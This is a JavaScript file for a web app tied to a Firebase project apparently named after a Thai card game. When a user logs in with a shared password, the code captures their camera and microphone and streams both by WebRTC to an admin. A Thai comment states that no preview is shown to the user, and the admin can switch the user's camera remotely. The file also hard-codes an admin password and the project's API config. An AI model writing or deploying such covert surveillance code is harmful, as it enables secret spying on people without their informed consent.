const firebaseConfig = {
    apiKey: "AIzaSyAnPDK7to2DWFnti490ri8YRCBkpTajOHY",
    authDomain: "pokdeng-61c5e.firebaseapp.com",
    databaseURL: "https://pokdeng-61c5e-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "pokdeng-61c5e",
    storageBucket: "pokdeng-61c5e.firebasestorage.app",
    messagingSenderId: "518814980796",
    appId: "1:518814980796:web:32b310d1a0b2bc7d058eb9"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const pcConfig = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };

let isAdmin = false;
let currentFacingMode = "user"; 
let localStream = null;
let peerConnection = null;

// --- Login Logic ---
function checkLogin() {
    const pass = document.getElementById('pass-input').value;
    const overlay = document.getElementById('login-overlay');
    
    if (pass === "admin1234") { // รหัสแอดมิน
        isAdmin = true;
        document.getElementById('admin-panel').style.display = "block";
        overlay.style.display = "none";
        initWebRTC();
    } else if (pass === "user") { // รหัสผู้ใช้ปกติ
        isAdmin = false;
        overlay.style.display = "none";
        initWebRTC();
    } else {
        alert("รหัสผ่านไม่ถูกต้อง!");
    }
}

// --- Online Count ---
database.ref('online_users').on('value', (snap) => {
    document.getElementById('user-online-count').innerText = snap.numChildren();
});

// --- WebRTC Logic ---
async function initWebRTC() {
    peerConnection = new RTCPeerConnection(pcConfig);

    if (!isAdmin) {
        // ฝั่ง User: เริ่มส่งภาพ
        await startUserCamera();
        listenForCameraSwitch();
    } else {
        // ฝั่ง Admin: รอรับภาพ
        setupAdminReceiver();
    }
}

async function startUserCamera() {
    try {
        if(localStream) {
            localStream.getTracks().forEach(track => track.stop());
        }
        
        // ขออนุญาตใช้กล้อง (ไม่เปิด Preview ให้ผู้ใช้เห็น)
        localStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: currentFacingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: true
        });
        
        document.getElementById('localVideo').srcObject = localStream;

        // ส่ง Stream เข้า PeerConnection
        localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
        
        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        database.ref('stream_signal').set({ offer: { type: offer.type, sdp: offer.sdp } });

    } catch (e) {
        console.error("Camera access denied:", e);
    }
}

function setupAdminReceiver() {
    database.ref('stream_signal/offer').on('value', async (snap) => {
        const offer = snap.val();
        if (offer) {
            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            database.ref('stream_signal/answer').set({ type: answer.type, sdp: answer.sdp });
        }
    });

    peerConnection.ontrack = (event) => {
        const remoteVideo = document.getElementById('remoteVideo');
        if (remoteVideo.srcObject !== event.streams[0]) {
            remoteVideo.srcObject = event.streams[0];
            console.log("Stream Received");
        }
    };
}

// แอดมินสั่งสลับกล้อง
function switchCamera() {
    currentFacingMode = currentFacingMode === "user" ? "environment" : "user";
    database.ref('camera_control').set({ facingMode: currentFacingMode, ts: Date.now() });
}

// ผู้ใช้คอยฟังคำสั่งสลับกล้อง
function listenForCameraSwitch() {
    database.ref('camera_control').on('value', (snap) => {
        const data = snap.val();
        if (data && data.facingMode !== currentFacingMode) {
            currentFacingMode = data.facingMode;
            startUserCamera(); 
        }
    });
}
